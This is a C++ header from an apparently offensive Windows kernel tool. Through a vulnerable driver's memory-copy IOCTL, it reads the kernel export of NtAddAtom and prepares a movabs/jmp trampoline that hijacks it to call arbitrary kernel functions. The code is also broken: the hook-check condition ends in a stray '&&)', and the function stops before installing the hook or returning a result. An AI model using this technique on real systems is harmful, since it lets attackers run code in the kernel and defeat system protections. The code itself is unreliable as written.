#pragma once
#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <random>
#include <Psapi.h>
#include "vulndriver.h"
#include "additional_nt.h"


typedef struct _REPLACEMENT {
    char* Replace;
    char WhereTo;
    int RepCount;
} REPLACEMENT, * PREPLACEMENT;


namespace general {
    int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString);
    int WcharpToCharp(char* ConvertString, const WCHAR* ConvertedString);
    std::wstring GetCurrentPathWide(std::wstring AddName);
    void GetCurrentPathRegular(char Path[], std::wstring AddName);
    int CountOccurrences(const char* SearchStr, char SearchLetter);
    void GetServiceName(char* Path, char* Buffer);
    void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size);
    DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size);
    void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension);
    int GetPidByName(const char* Name);
    int CheckLetterInArr(char Chr, const char* Arr);
    BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
}


namespace specific {
    DWORD MemoryToFile(LPCWSTR FileName, BYTE MemoryData[], SIZE_T MemorySize);
    PVOID GetKernelModuleAddress(const char* ModuleName);
    BOOL CompareBetweenData(const BYTE DataToCheck[], const BYTE CheckAgainst[], const char* SearchMask);
    PVOID FindPattern(PVOID StartingAddress, ULONG SearchLength, BYTE CheckAgainst[], const char* SearchMask);
    PVOID FindSectionOfKernelModule(const char* SectionName, PVOID HeadersPointer, ULONG* SectionSize);
    PVOID GetKernelModuleExport(HANDLE* DeviceHandle, PVOID KernelBaseAddress, const char* ExportName);
    BOOL HandleResourceLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID FunctionResource, BOOL ShouldWait, BOOL IsAcquire);

    template<typename UnkType, typename ...Args>
    BOOL CallKernelFunction(HANDLE* DeviceHandle, UnkType* FunctionResult, PVOID FunctionAddress,
                            PVOID KernelBaseAddress, BYTE OriginalFunctionData[], const Args ...FunctionArguments) {
        HMODULE NtDll = GetModuleHandleA("ntdll.dll");
        PVOID NtAddAtom = NULL;
        PVOID NtAddAtomExport = NULL;
        BYTE TrampolineHook[] = { 0x49, 0xbd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // movabs r13, FunctionAddress
                                  0x41, 0xff, 0xe5 };  // jmp r13 (FunctionAddress)
        RtlCopyMemory(&TrampolineHook[2], &FunctionAddress, sizeof(PVOID));


        // Get handle to ntdll.dll:
        if (NtDll == NULL) {
            return FALSE;
        }


        // Get address of NtAddAtom to abuse:
        NtAddAtom = (PVOID)GetProcAddress(NtDll, "NtAddAtom");
        if (NtAddAtom == NULL) {
            return FALSE;
        }


        // Get the kernel export of NtAddAtom itself:
        NtAddAtomExport = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "NtAddAtom");
        if (NtAddAtomExport == NULL) {
            return FALSE;
        }


        // Read the original data from the export into a saved buffer:
        if (OriginalFunctionData == NULL) {
            return FALSE;  // Cannot save original data
        }
        if (!VulnurableDriver::IoctlFunctions::MemoryCopy(DeviceHandle, OriginalFunctionData, NtAddAtomExport, sizeof(TrampolineHook))) {
            return FALSE;  // Cannot save original data
        }


        // Check if the kernel export is already hooked:
        if (OriginalFunctionData[0] == TrampolineHook[0] && OriginalFunctionData[1] == TrampolineHook[1] &&
            OriginalFunctionData[sizeof(TrampolineHook) - 2] == TrampolineHook[sizeof(TrampolineHook) - 2] &&
            OriginalFunctionData[sizeof(TrampolineHook) - 1] == TrampolineHook[sizeof(TrampolineHook) - 1] &&
            OriginalFunctionData[sizeof(TrampolineHook) - 3] == TrampolineHook[sizeof(TrampolineHook) - 3] &&) {
            return FALSE;  // Function is already hooked, movabs and jmp are installed
        }
    }
}